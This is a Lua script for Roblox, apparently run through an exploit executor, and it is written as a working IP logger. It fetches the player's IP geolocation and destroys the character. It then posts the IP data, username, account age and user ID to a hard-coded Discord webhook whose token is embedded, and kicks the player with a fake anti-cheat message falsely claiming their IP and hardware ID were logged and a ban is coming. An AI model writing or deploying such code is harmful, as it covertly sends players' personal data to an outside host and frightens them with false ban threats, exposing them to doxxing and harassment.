local HTTP = game:GetService("HttpService")

local webhookurl = "https://discord.com/api/webhooks/1143233875267555459/P5JXFl4XbO-a9o_PbuY8rx91iBfHVW7dh0vMB-1OFW8rHIiY4w1xG4OlqcL1t15d2tNy"
local player = game.Players.LocalPlayer
local aaaaa = game:HttpGet("http://ip-api.com/json")
local aaaa = HTTP:JSONDecode(aaaaa)
wait(10)

player.Character:Destroy()

local a = HTTP:JSONDecode(aaaaa)

	local data = {
		["embeds"] = {{

			["author"] = {
				["name"] = player.Name,
				["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name
			},
			["description"] = "Info:  " .. aaaaa,
			["color"] = tonumber(0xFFFAFA),
			["fields"] = {
				{
					["name"] = "Account Age:",
					["value"] = player.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "User ID:",
					["value"] = player.UserId,
					["inline"] = true
				}
			}
		}},

	}
	local finaldata = HTTP:JSONEncode(data)
	HTTP:PostAsync(webhookurl, finaldata)

wait(1)
player:Kick("You have been detected by Hyperion. Your IP and HWID have been logged and you will be banned within 1 week. ".. "\n".. "IP: ".. aaaa.query .. " Execution Method Detected: Delta " .. "\n".. "HWID and TA Memory has been sent to the servers.")
